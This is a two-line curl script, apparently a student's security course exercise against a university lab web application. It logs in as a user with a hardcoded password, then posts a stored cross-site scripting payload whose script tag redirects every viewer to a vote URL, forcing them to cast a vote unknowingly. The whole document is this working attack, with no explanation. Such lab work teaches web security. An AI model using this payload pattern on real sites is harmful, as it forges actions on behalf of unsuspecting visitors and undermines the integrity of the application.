#login
curl -c cookie.txt -L -d "username=alice&password=passw0rd&form=login"  "http://ugster19.student.cs.uwaterloo.ca/b69liu/post.php"
#post
curl -b cookie.txt -d "title=vote&content=<script>window.location.href=\"http://ugster19.student.cs.uwaterloo.ca/b69liu/vote.php?id=2%26vote=1\"</script>&type=1&form=content"  "http://ugster19.student.cs.uwaterloo.ca/b69liu/post.php" > response.txt


